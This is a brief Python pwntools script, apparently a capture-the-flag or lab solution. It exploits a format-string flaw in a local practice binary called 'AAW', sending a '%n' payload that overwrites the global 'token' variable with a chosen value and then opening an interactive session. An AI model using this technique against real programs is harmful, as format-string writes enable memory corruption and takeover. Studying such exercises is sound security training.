from pwn import *

e = ELF("./AAW")
p = process(e.path)

p.recvuntil(b"fmt : ")
fmt = b"%1234c"
fmt += b'%10$n'
fmt = fmt.ljust(0x20, b'\x00')
fmt += p64(e.symbols["token"])
p.sendline(fmt)

p.interactive()